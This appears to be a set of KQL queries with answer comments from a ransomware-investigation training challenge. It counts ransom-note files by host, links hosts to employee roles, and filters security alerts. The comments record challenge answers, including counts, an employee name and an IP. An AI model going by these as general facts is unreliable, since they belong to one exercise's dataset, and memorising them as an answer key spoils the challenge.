//let see what tables are given
search *
| distinct $table

FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
|count //774

//How many distinct hostnames had the ransom note?
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
  | summarize Count = count() by hostname
  |distinct hostname //774

  //How many distinct employee roles were affected by the ransomware attack?

  let roleranaffect =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
  |distinct hostname; // check the common command in Filecreationevent and Employee
  Employees
  | where hostname  has_any (roleranaffect) // affect the common comand to the variable
  | distinct role // 18

//How many unique hostnames belong to IT employees?
  let roleranaffect =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
  |distinct hostname; // check the common command in Filecreationevent and Employee
  Employees
  | where hostname  has_any (roleranaffect) // affect the common comand to the variable
    | summarize Count = count() by role //25

// What is that employee's name? One of the IT employees has an IP address that ends in .46.
  let roleranaffect =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
  |distinct hostname; // check the common command in Filecreationevent and Employee
  Employees
  | where hostname  has_any (roleranaffect) // affect the common comand to the variable
  | where role contains "IT Helpdesk" and ip_addr endswith ".46"
  | project name, ip_addr, role //Simeon Kakpovi ; 10.10.0.46

//How many security alerts involved the different hosts?
let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (impact_hosts) //652


//How many Security Alerts reference the hostnames of helpdesk employees that received ransom notes?

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let helpdesk_hostnames = Employees
| where hostname in (impact_hosts)
| where role contains "IT Helpdesk"
| distinct hostname;
SecurityAlerts
| where description has_any (helpdesk_hostnames)

//Who owns the machine that was flagged on that alert? (provide their name)

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let helpdesk_hostnames = Employees
| where hostname in (impact_hosts)
| where role contains "IT Helpdesk"
| distinct hostname;
SecurityAlerts
| where description has_any (helpdesk_hostnames)
| parse description with "host" hostnameFlag "." *
| where hostnameFlag contains "machine"
| distinct hostnameFlag

